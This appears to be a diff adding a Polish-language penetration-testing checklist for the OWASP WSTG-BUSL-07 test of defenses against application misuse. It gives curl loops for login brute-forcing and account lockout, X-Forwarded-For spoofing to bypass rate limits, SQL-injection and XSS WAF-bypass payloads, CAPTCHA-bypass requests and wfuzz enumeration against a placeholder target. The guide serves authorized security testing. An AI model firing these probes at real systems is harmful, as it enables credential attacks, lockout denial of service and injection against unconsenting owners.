@@ -1,0 +1,74 @@
+================================================================================
+WSTG-BUSL-07 — Test Defenses Against Application Misuse
+================================================================================
+CELE:
+- Przegladnac zabezpieczenia przed naduzyciami aplikacji
+- Zweryfikowac mozliwosc obejscia zabezpieczen
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Testowanie rate limiting ---
+for i in $(seq 1 100); do
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" TARGET/api/login -X POST -d "user=admin&pass=test${i}")
+    echo "Request $i: HTTP $RESPONSE"
+done
+
+# --- Testowanie rate limiting z roznych IP ---
+for i in $(seq 1 20); do
+    curl -s -o /dev/null -w "IP 1.1.1.$i: %{http_code}\n" TARGET/api/login \
+      -X POST -d "user=admin&pass=test" -H "X-Forwarded-For: 1.1.1.${i}"
+done
+
+# --- Testowanie WAF rules ---
+curl -v "TARGET/page?id=1' OR 1=1--"
+curl -v "TARGET/page?id=1'/**/OR/**/1=1--"
+curl -v "TARGET/page?id=1%27%20OR%201%3D1--"
+
+# --- Testowanie obejscia WAF ---
+curl -v "TARGET/?param=<script>alert(1)</script>"
+curl -v "TARGET/?param=<ScRiPt>alert(1)</ScRiPt>"
+curl -v "TARGET/?param=<img src=x onerror=alert(1)>"
+curl -v -H "Content-Type: application/json" TARGET/api -d '{"param":"<script>alert(1)</script>"}'
+
+# --- Testowanie CAPTCHA bypass ---
+# Sprawdz czy CAPTCHA jest walidowana po stronie serwera:
+curl -v -X POST TARGET/login -d "user=test&pass=test&captcha="
+curl -v -X POST TARGET/login -d "user=test&pass=test"
+# Wyslij stare rozwiazanie CAPTCHA:
+curl -v -X POST TARGET/login -d "user=test&pass=test&captcha=OLD_CAPTCHA_VALUE"
+
+# --- Testowanie account lockout ---
+for i in $(seq 1 15); do
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST TARGET/login -d "user=victim&pass=wrong${i}")
+    echo "Attempt $i: HTTP $RESPONSE"
+done
+# Sprawdz czy konto jest zablokowane:
+curl -v -X POST TARGET/login -d "user=victim&pass=correct_password"
+
+# --- Testowanie automatyzacji (bot detection) ---
+curl -v TARGET/api/endpoint -H "User-Agent: python-requests/2.28.0"
+curl -v TARGET/api/endpoint -H "User-Agent: curl/7.88.1"
+curl -v TARGET/api/endpoint -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# --- Agresywne fuzzowanie ---
+wfuzz -c --hc 404 -z range,1-1000 TARGET/api/item/FUZZ
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- Brak dedykowanych wordlist - test oparty na logice zabezpieczen ---
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Testuj rate limiting na krytycznych endpointach (login, reset password, API)
+2. Sprawdz czy CAPTCHA jest egzekwowana po kazdej probie (nie tylko po kilku blednych)
+3. Testuj obejscie rate limitingu: X-Forwarded-For, X-Real-IP, rozne User-Agents
+4. Sprawdz czy account lockout dziala i czy mozna go wykorzystac do DoS
+5. Testuj WAF bypass: rozne encodingi, case manipulation, komentarze SQL
+6. Sprawdz czy aplikacja loguje podejrzana aktywnosc
+7. Testuj czy aplikacja blokuje agresywne skanowanie (wiele 404, szybkie requesty)
+8. Sprawdz odpowiedzi na abuse: czy sa informacyjne (ulatwiaja atakujacemu)?
